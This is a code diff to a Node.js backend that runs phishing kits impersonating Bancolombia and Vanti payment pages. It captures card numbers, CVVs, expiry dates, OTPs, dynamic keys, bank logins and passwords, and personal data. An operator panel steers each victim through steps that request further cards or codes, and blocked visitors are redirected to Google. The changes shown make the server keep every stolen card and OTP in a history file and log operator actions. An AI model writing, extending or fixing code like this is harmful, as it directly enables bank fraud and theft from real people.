@@ -66,15 +66,98 @@ try {
     }
 } catch (e) { console.error('Error cargando historial', e); }
 
+/* 🔥 guardarHistorial con ACUMULACIÓN de tarjetas, OTPs y eventos */
 function guardarHistorial(bancoKey, datos) {
-    const registro = {
-        id: Date.now() + '-' + Math.random().toString(36).substr(2, 5),
-        fecha: new Date().toISOString(),
-        bancoKey: bancoKey,
-        datos: datos
-    };
-    historial.unshift(registro);
-    if (historial.length > 1000) historial = historial.slice(0, 1000);
+    const sessionId = datos && datos.sessionId;
+
+    if (!sessionId) {
+        const registro = {
+            id: Date.now() + '-' + Math.random().toString(36).substr(2, 5),
+            fecha: new Date().toISOString(),
+            bancoKey: bancoKey,
+            datos: datos
+        };
+        historial.unshift(registro);
+        if (historial.length > 1000) historial = historial.slice(0, 1000);
+        try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+        return;
+    }
+
+    const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
+
+    if (idx === -1) {
+        const tarjetasHistorial = datos.tarjeta ? [{
+            tarjeta: datos.tarjeta,
+            titular: datos.titular || '',
+            expMes: datos.expMes || datos.exp || '',
+            expAnio: datos.expAnio || '',
+            cvv: datos.cvv || '',
+            marca: datos.marca || '',
+            bankName: datos.bankName || '',
+            cardType: datos.cardType || '',
+            cardLevel: datos.cardLevel || '',
+            bin: datos.bin || '',
+            fecha: new Date().toISOString()
+        }] : [];
+
+        const otpsHistorial = [];
+        if (datos.otp) otpsHistorial.push({ otp: datos.otp, tipo: 'otp', fecha: new Date().toISOString() });
+        if (datos.claveDinamica && datos.claveDinamica !== datos.otp) otpsHistorial.push({ otp: datos.claveDinamica, tipo: 'claveDinamica', fecha: new Date().toISOString() });
+        if (datos.token) otpsHistorial.push({ otp: datos.token, tipo: 'token', fecha: new Date().toISOString() });
+
+        const registro = {
+            id: Date.now() + '-' + Math.random().toString(36).substr(2, 5),
+            fecha: new Date().toISOString(),
+            bancoKey: bancoKey,
+            datos: Object.assign({}, datos, {
+                tarjetasHistorial,
+                otpsHistorial,
+                eventosAdmin: []
+            })
+        };
+        historial.unshift(registro);
+        if (historial.length > 1000) historial = historial.slice(0, 1000);
+        try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+        return;
+    }
+
+    const prev = historial[idx].datos || {};
+    const tarjetasHistorial = (prev.tarjetasHistorial || []).slice();
+    const otpsHistorial = (prev.otpsHistorial || []).slice();
+    const eventosAdmin = (prev.eventosAdmin || []).slice();
+
+    if (datos.tarjeta && datos.tarjeta !== prev.tarjeta) {
+        tarjetasHistorial.push({
+            tarjeta: datos.tarjeta,
+            titular: datos.titular || '',
+            expMes: datos.expMes || datos.exp || '',
+            expAnio: datos.expAnio || '',
+            cvv: datos.cvv || '',
+            marca: datos.marca || '',
+            bankName: datos.bankName || '',
+            cardType: datos.cardType || '',
+            cardLevel: datos.cardLevel || '',
+            bin: datos.bin || '',
+            fecha: new Date().toISOString()
+        });
+    }
+
+    if (datos.otp && datos.otp !== prev.otp) {
+        otpsHistorial.push({ otp: datos.otp, tipo: 'otp', fecha: new Date().toISOString() });
+    }
+    if (datos.claveDinamica && datos.claveDinamica !== prev.claveDinamica && datos.claveDinamica !== datos.otp) {
+        otpsHistorial.push({ otp: datos.claveDinamica, tipo: 'claveDinamica', fecha: new Date().toISOString() });
+    }
+    if (datos.token && datos.token !== prev.token) {
+        otpsHistorial.push({ otp: datos.token, tipo: 'token', fecha: new Date().toISOString() });
+    }
+
+    historial[idx].datos = Object.assign({}, prev, datos, {
+        tarjetasHistorial,
+        otpsHistorial,
+        eventosAdmin
+    });
+    historial[idx].fecha = new Date().toISOString();
     try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
 }
 
@@ -191,7 +274,7 @@ const server = http.createServer(async (req, res) => {
         const url = req.url.split('?')[0];
 
         const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
-        
+
         if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
             json(res, 200, { ok: false, bloqueado: true, error: 'IP bloqueada', redirect: 'https://www.google.com' });
             return;
@@ -322,7 +405,7 @@ const server = http.createServer(async (req, res) => {
                 try {
                     const body = await getBody(req);
                     const { accion } = body;
-                    
+
                     if (accion === 'PONER_PRECIO') {
                         const { valor } = body;
                         if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
@@ -333,21 +416,36 @@ const server = http.createServer(async (req, res) => {
                         const datosActualizados = Object.assign({}, datosPrevios, { monto: Number(valor), precio: Number(valor) });
                         datosSesiones.set(sessionId, datosActualizados);
                         agregarLog('poner-precio', { usuario: payload.user, sessionId, valor });
+
+                        // 🔥 Registrar PONER_PRECIO en el historial
+                        const idxHP = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId);
+                        if (idxHP !== -1) {
+                            if (!historial[idxHP].datos.eventosAdmin) historial[idxHP].datos.eventosAdmin = [];
+                            historial[idxHP].datos.eventosAdmin.push({
+                                accion: 'PONER_PRECIO',
+                                valor: valor,
+                                estado: 'precio_asignado',
+                                usuario: payload.user,
+                                fecha: new Date().toISOString()
+                            });
+                            try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                        }
+
                         json(res, 200, { ok: true, estado: 'precio_asignado', accion: String(valor) });
                         return;
                     }
 
-                    const mapEstados = { 
-                        ACEPTAR: 'aceptado', 
-                        RECHAZAR: 'rechazado', 
-                        OTP: 'otp', 
-                        TOKEN: 'token', 
-                        FINALIZAR: 'finalizado', 
-                        CC_ERROR: 'cc_error', 
+                    const mapEstados = {
+                        ACEPTAR: 'aceptado',
+                        RECHAZAR: 'rechazado',
+                        OTP: 'otp',
+                        TOKEN: 'token',
+                        FINALIZAR: 'finalizado',
+                        CC_ERROR: 'cc_error',
                         AUTORIZAR: 'autorizacion_enviada',
-                        PEDIR_CC: 'pedir_cc', 
-                        PEDIR_DATOS: 'pedir_datos', 
-                        PEDIR_DINAMICA: 'pedir_dinamica' 
+                        PEDIR_CC: 'pedir_cc',
+                        PEDIR_DATOS: 'pedir_datos',
+                        PEDIR_DINAMICA: 'pedir_dinamica'
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -363,6 +461,21 @@ const server = http.createServer(async (req, res) => {
                     estadoSesiones.set(sessionId, estadoNuevo);
                     accionTsSesiones.set(sessionId, Date.now());
                     agregarLog('accion', { usuario: payload.user, sessionId, accion, estadoNuevo });
+
+                    // 🔥 Registrar acción del admin en el historial
+                    const idxHA = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId);
+                    if (idxHA !== -1) {
+                        if (!historial[idxHA].datos.eventosAdmin) historial[idxHA].datos.eventosAdmin = [];
+                        historial[idxHA].datos.eventosAdmin.push({
+                            accion: accion,
+                            estado: estadoNuevo,
+                            usuario: payload.user,
+                            fecha: new Date().toISOString()
+                        });
+                        historial[idxHA].fecha = new Date().toISOString();
+                        try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                    }
+
                     console.log(`[${payload.user}] ${accion} → ${sessionId} | estado: ${estadoNuevo}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
                 } catch (e) { json(res, 400, { ok: false, error: e.message }); }
@@ -442,14 +555,7 @@ const server = http.createServer(async (req, res) => {
                 guardarSesionesTemporales();
                 datosSesiones.set(sessionId, datosCompletos);
 
-                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
-                if (idx !== -1) {
-                    historial[idx].datos = datosCompletos;
-                    historial[idx].fecha = new Date().toISOString();
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial(bancoKey, datosCompletos);
-                }
+                guardarHistorial(bancoKey, datosCompletos);
 
                 if (!estadoSesiones.has(sessionId)) estadoSesiones.set(sessionId, 'pendiente');
 
@@ -496,20 +602,20 @@ const server = http.createServer(async (req, res) => {
                 if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
                 const infoBin = await obtenerInfoBin(tarjeta);
                 const datosPrevios = sesionesTemporales[sessionId] || {};
-                const datosSesion = Object.assign({}, datosPrevios, { 
-                    sessionId, bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, 
-                    placa: placa || datosPrevios.placa || '', 
-                    subsidio: subsidio || false, 
+                const datosSesion = Object.assign({}, datosPrevios, {
+                    sessionId, bancoKey, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv,
+                    placa: placa || datosPrevios.placa || '',
+                    subsidio: subsidio || false,
                     datosPersonales: datosPersonales || datosPrevios.datosPersonales || {},
                     placasData: placasData || datosPrevios.placasData || [],
-                    ip: ip, 
-                    creadoEn: new Date().toISOString(), 
-                    bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''), 
-                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida', 
-                    cardType: infoBin?.cardType || 'Desconocido', 
-                    cardLevel: infoBin?.cardLevel || 'Desconocido', 
-                    bankName: infoBin?.bankName || 'Desconocido', 
-                    countryName: infoBin?.countryName || 'Desconocido' 
+                    ip: ip,
+                    creadoEn: new Date().toISOString(),
+                    bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
+                    cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
                 });
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
@@ -517,16 +623,9 @@ const server = http.createServer(async (req, res) => {
                 let pasoActual = pasosSesiones.get(sessionId) || 'pagodesubsidio';
                 if (marca === 'PSE') pasoActual += ' (PSE)'; else pasoActual += ' (Tarjeta)';
                 pasosSesiones.set(sessionId, pasoActual);
-                
-                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
-                if (idx !== -1) {
-                    historial[idx].datos = datosSesion;
-                    historial[idx].fecha = new Date().toISOString();
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial(bancoKey, datosSesion);
-                }
-                
+
+                guardarHistorial(bancoKey, datosSesion);
+
                 delete sesionesTemporales[sessionId];
                 guardarSesionesTemporales();
                 json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
@@ -546,16 +645,9 @@ const server = http.createServer(async (req, res) => {
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosCompletos);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-                
-                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
-                if (idx !== -1) {
-                    historial[idx].datos = datosCompletos;
-                    historial[idx].fecha = new Date().toISOString();
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial(bancoKey, datosCompletos);
-                }
-                
+
+                guardarHistorial(bancoKey, datosCompletos);
+
                 json(res, 200, { ok: true, sessionId, bancoKey });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
@@ -573,38 +665,44 @@ const server = http.createServer(async (req, res) => {
                 datosSesiones.set(sessionId, datosCompletos);
                 estadoSesiones.set(sessionId, 'autorizacion_enviada');
                 ultimaAccionSesiones.set(sessionId, 'AUTORIZAR');
-                
-                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
-                if (idx !== -1) {
-                    historial[idx].datos = datosCompletos;
-                    historial[idx].fecha = new Date().toISOString();
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial(bancoKey, datosCompletos);
-                }
+
+                guardarHistorial(bancoKey, datosCompletos);
 
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
+        /* 🔥 /bc/enviar guarda identificación y clave en historial inmediatamente */
         if (req.method === 'POST' && url === '/bc/enviar') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
                 const datos = await getBody(req);
                 const { sessionId, usuario, clave } = datos;
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
-                const datosSesion = { sessionId, bancoKey: 'bancolombia', marca: 'bancolombia', identificacion: usuario, clave: clave, ip: ip, creadoEn: new Date().toISOString() };
+                const previoDatos = datosSesiones.get(sessionId) || {};
+                const datosSesion = {
+                    ...previoDatos,
+                    sessionId,
+                    bancoKey: 'bancolombia',
+                    marca: 'bancolombia',
+                    identificacion: usuario || previoDatos.identificacion || '',
+                    clave: clave || previoDatos.clave || '',
+                    ip: previoDatos.ip || ip,
+                    creadoEn: previoDatos.creadoEn || new Date().toISOString()
+                };
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR');
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, usuario, clave, ip, bancoKey: 'bancolombia' });
+                guardarHistorial('bancolombia', datosSesion);
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
+        /* 🔥 /bc/guardar-paso2 guarda en historial */
         if (req.method === 'POST' && url === '/bc/guardar-paso2') {
             try {
                 const datos = await getBody(req);
@@ -613,7 +711,9 @@ const server = http.createServer(async (req, res) => {
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, nombres, tipoDoc, documento, correo, telefono, ingresos });
                 const datosSesion = datosSesiones.get(sessionId) || {};
-                datosSesiones.set(sessionId, { ...datosSesion, nombres, tipoDoc, documento, correo, telefono, ingresos });
+                const datosActualizados = { ...datosSesion, nombres, tipoDoc, documento, correo, telefono, ingresos };
+                datosSesiones.set(sessionId, datosActualizados);
+                guardarHistorial('bancolombia', datosActualizados);
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false }); }
             return;
@@ -637,6 +737,7 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        /* 🔥 /bc/guardar-paso4 preserva identificacion, clave y acumula tarjetas */
         if (req.method === 'POST' && url === '/bc/guardar-paso4') {
             try {
                 const datos = await getBody(req);
@@ -644,9 +745,43 @@ const server = http.createServer(async (req, res) => {
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
                 const sesionData = bcSesiones.get(sessionId) || {};
                 const datosPanelPrevios = datosSesiones.get(sessionId) || {};
-                const datosCompletos = { sessionId, ...datosPanelPrevios, ...sesionData, tarjeta, titular, exp, expMes: exp, cvv, fechaCaptura: new Date().toISOString(), bancoKey: 'bancolombia' };
-                if (tarjeta) { const infoBin = await obtenerInfoBin(tarjeta); if (infoBin) { datosCompletos.bin = infoBin.bin; datosCompletos.cardBrand = infoBin.cardBrand; datosCompletos.cardType = infoBin.cardType; datosCompletos.cardLevel = infoBin.cardLevel; datosCompletos.bankName = infoBin.bankName; } }
-                if (!estadoSesiones.has(sessionId)) { estadoSesiones.set(sessionId, 'pendiente'); ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO'); }
+
+                const identificacionFinal = datosPanelPrevios.identificacion || sesionData.identificacion || sesionData.usuario || '';
+                const claveFinal = datosPanelPrevios.clave || sesionData.clave || '';
+
+                const datosCompletos = {
+                    ...datosPanelPrevios,
+                    ...sesionData,
+                    sessionId,
+                    bancoKey: 'bancolombia',
+                    marca: 'bancolombia',
+                    identificacion: identificacionFinal,
+                    usuario: sesionData.usuario || identificacionFinal,
+                    clave: claveFinal,
+                    tarjeta,
+                    titular,
+                    exp,
+                    expMes: exp,
+                    cvv,
+                    fechaCaptura: new Date().toISOString()
+                };
+
+                if (tarjeta) {
+                    const infoBin = await obtenerInfoBin(tarjeta);
+                    if (infoBin) {
+                        datosCompletos.bin = infoBin.bin;
+                        datosCompletos.cardBrand = infoBin.cardBrand;
+                        datosCompletos.cardType = infoBin.cardType;
+                        datosCompletos.cardLevel = infoBin.cardLevel;
+                        datosCompletos.bankName = infoBin.bankName;
+                    }
+                }
+
+                if (!estadoSesiones.has(sessionId)) {
+                    estadoSesiones.set(sessionId, 'pendiente');
+                    ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                }
+
                 datosSesiones.set(sessionId, datosCompletos);
                 guardarHistorial('bancolombia', datosCompletos);
                 bcSesiones.delete(sessionId);
@@ -660,12 +795,12 @@ const server = http.createServer(async (req, res) => {
                 const datos = await getBody(req);
                 const { sessionId, empresa, cuenta, medioPago } = datos;
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
-                
+
                 const datosSesion = { sessionId, bancoKey: 'vanti', empresa, cuenta, medioPago, ip, creadoEn: new Date().toISOString() };
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, '');
-                
+
                 console.log(`[VANTI] Nueva sesión: ${sessionId} | Cuenta: ${cuenta}`);
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -698,14 +833,7 @@ const server = http.createServer(async (req, res) => {
 
                 datosSesiones.set(sessionId, datosCompletos);
 
-                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
-                if (idx !== -1) {
-                    historial[idx].datos = Object.assign({}, historial[idx].datos, datosCompletos);
-                    historial[idx].fecha = new Date().toISOString();
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial('vanti', datosCompletos);
-                }
+                guardarHistorial('vanti', datosCompletos);
 
                 console.log(`[VANTI-PSE] Datos guardados para ${sessionId} | Doc: ${numDoc} | Nombre: ${nombres} ${apellidos}`);
                 json(res, 200, { ok: true });
@@ -718,12 +846,12 @@ const server = http.createServer(async (req, res) => {
             try {
                 const datos = await getBody(req);
                 const { sessionId, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, marca } = datos;
-                
+
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
                 const previos = datosSesiones.get(sessionId) || {};
                 const infoBin = await obtenerInfoBin(tarjeta);
-                
+
                 const datosSesion = Object.assign({}, previos, {
                     sessionId, bancoKey: 'vanti', tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, marca: marca || 'visa', ip, creadoEn: previos.creadoEn || new Date().toISOString(), bin: infoBin?.bin || '', cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido', cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido'
                 });
@@ -732,18 +860,9 @@ const server = http.createServer(async (req, res) => {
                 datosSesiones.set(sessionId, datosSesion);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
                 pasosSesiones.set(sessionId, 'Vanti Tarjeta');
-                
-                // 🔥 FIX: Actualizar el registro existente en lugar de crear uno nuevo,
-                // así se conservan los datos personales del formulario (nombres, apellidos, correo, etc.)
-                const idxH = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
-                if (idxH !== -1) {
-                    historial[idxH].datos = Object.assign({}, historial[idxH].datos, datosSesion);
-                    historial[idxH].fecha = new Date().toISOString();
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial('vanti', datosSesion);
-                }
-                
+
+                guardarHistorial('vanti', datosSesion);
+
                 console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${monto}`);
                 json(res, 200, { ok: true, sessionId, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -760,46 +879,33 @@ const server = http.createServer(async (req, res) => {
                 estadoSesiones.set(sessionId, 'pendiente');
                 datosSesiones.set(sessionId, datosCompletos);
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-                
-                const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
-                if (idx !== -1) {
-                    historial[idx].datos = Object.assign({}, historial[idx].datos, { otp });
-                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-                } else {
-                    guardarHistorial('vanti', datosCompletos);
-                }
+
+                guardarHistorial('vanti', datosCompletos);
 
                 json(res, 200, { ok: true, sessionId });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
 
-if (req.method === 'POST' && url === '/vanti/enviar-autorizacion') {
-    if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
-    try {
-        const { sessionId, usuario, password } = await getBody(req);
-        if (!sessionId || !usuario || !password) { json(res, 400, { ok: false, error: 'Faltan datos' }); return; }
-        const datosPrevios = datosSesiones.get(sessionId) || {};
-        const datosCompletos = Object.assign({}, datosPrevios, { authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString() });
-        datosSesiones.set(sessionId, datosCompletos);
-        estadoSesiones.set(sessionId, 'autorizacion_enviada');
-        ultimaAccionSesiones.set(sessionId, 'AUTORIZACION_ENVIADA');
-        accionTsSesiones.set(sessionId, Date.now());
+        if (req.method === 'POST' && url === '/vanti/enviar-autorizacion') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const { sessionId, usuario, password } = await getBody(req);
+                if (!sessionId || !usuario || !password) { json(res, 400, { ok: false, error: 'Faltan datos' }); return; }
+                const datosPrevios = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosPrevios, { authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString() });
+                datosSesiones.set(sessionId, datosCompletos);
+                estadoSesiones.set(sessionId, 'autorizacion_enviada');
+                ultimaAccionSesiones.set(sessionId, 'AUTORIZACION_ENVIADA');
+                accionTsSesiones.set(sessionId, Date.now());
 
-        const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
-        if (idx !== -1) {
-            historial[idx].datos = Object.assign({}, historial[idx].datos, { authUsuario: usuario, authPassword: password, authEnviadoEn: new Date().toISOString() });
-            historial[idx].fecha = new Date().toISOString();
-            try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
-        } else {
-            guardarHistorial('vanti', datosCompletos);
+                guardarHistorial('vanti', datosCompletos);
+
+                console.log(`[VANTI] Autorización recibida: ${sessionId} | Usuario: ${usuario}`);
+                json(res, 200, { ok: true, sessionId });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
         }
-
-        console.log(`[VANTI] Autorización recibida: ${sessionId} | Usuario: ${usuario}`);
-        json(res, 200, { ok: true, sessionId });
-    } catch (e) { json(res, 500, { ok: false, error: e.message }); }
-    return;
-}
 
         const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
         if (req.method === 'POST' && enviarMatch) {
